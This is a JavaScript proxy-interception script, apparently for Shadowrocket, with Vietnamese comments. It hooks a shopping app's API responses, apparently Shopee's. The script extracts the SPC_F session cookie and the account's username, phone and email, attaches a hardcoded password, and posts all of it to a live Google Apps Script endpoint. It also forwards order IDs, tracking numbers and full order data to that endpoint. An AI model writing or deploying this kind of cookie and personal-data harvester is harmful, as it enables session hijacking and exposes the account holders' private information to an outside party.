// ==========================================
// 1. LẤY URL VÀ XỬ LÝ COOKIE (CHỈ LẤY SPC_F)
// ==========================================
let requestUrl = $request.url;
let headers = $request.headers;
let cookieStr = headers['Cookie'] || headers['cookie'] || "";

let extractedCookie = "";

// Phân tích Cookie để chỉ lấy SPC_F
if (cookieStr) {
    let cookies = cookieStr.split(';');
    for (let c of cookies) {
        let item = c.trim();
        if (item.startsWith("SPC_F=")) {
            extractedCookie = item;
            break; // Tìm thấy SPC_F thì thoát vòng lặp luôn cho tối ưu
        }
    }
}


// ==========================================
// 2. HÀM GỬI POST REQUEST LÊN GAS
// ==========================================
const GAS_URL = "https://script.google.com/macros/s/AKfycbzvx21Nt5og1Ov0a73daLFkhTh5ZnuLXMB8aquI_9FcD9DUDmq7YqkaB82Ig506iShB/exec";
let body = $response.body;

function sendToGas(payload) {
    let req = {
        url: GAS_URL,
        header: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    };

    $httpClient.post(req, function(error, response, data) {
        if (error) {
            console.log("Lỗi gửi dữ liệu lên GAS: " + error);
        } else {
            console.log("Gửi GAS thành công: " + data);
        }
        // Trả về body nguyên gốc để App không bị lỗi
        $done({ body });
    });
}

// ==========================================
// 3. ROUTER: KIỂM TRA URL VÀ TẠO PAYLOAD
// ==========================================
try {
    let obj = JSON.parse(body);

    // CASE 1: THÊM TÀI KHOẢN MỚI
    if (requestUrl.indexOf("get_account_info") !== -1) {
        if (obj && obj.data) {
            let payload = {
                action: "add_new_user",
                url: requestUrl,
                username: obj.data.username || "",
                phone: obj.data.phone || "",
                email: obj.data.email || "",
                password: "Nguyentrong1",
                cookie: extractedCookie // Lúc này cookie chỉ chứa "SPC_F=..."
            };
            sendToGas(payload);
        } else {
            $done({ body });
        }
    } 
    
    // CASE 2: CẬP NHẬT ĐƠN HÀNG (LẤY TRACKING)
    else if (requestUrl.indexOf("get_order_detail") !== -1) {
        if (obj && obj.data) {
            // Shadowrocket hỗ trợ Regex, ta lấy order_id trực tiếp từ URL
            let orderId = "";
            let match = requestUrl.match(/order_id=(\d+)/);
            if (match) {
                orderId = match[1];
            }

            // Truy xuất lấy tracking_number
            let trackingNumber = "";
            if (obj.data.shipping_info && obj.data.shipping_info.parcels && obj.data.shipping_info.parcels.length > 0) {
                trackingNumber = obj.data.shipping_info.parcels[0].tracking_number;
            }

            let payload = {
                action: "get_order_detail",
                url: requestUrl,
                cookie: extractedCookie, // Lúc này cookie chỉ chứa "SPC_F=..."
                
                // Truyền trực tiếp order_id và tracking_number lên luôn
                order_id: orderId,
                tracking_number: trackingNumber,
                
                // Truyền toàn bộ object gốc vào "response" và "data" 
                // để tương thích 100% với hàm handleUpdateOrderCase() trên GAS
                response: obj,
                data: obj.data 
            };
            sendToGas(payload);
        } else {
            $done({ body });
        }
    } 
    
    // CASE MẶC ĐỊNH KHÔNG KHỚP BỎ QUA
    else {
        $done({ body });
    }

} catch (e) {
    console.log("Lỗi parse JSON hoặc xử lý script: " + e);
    $done({ body });
}
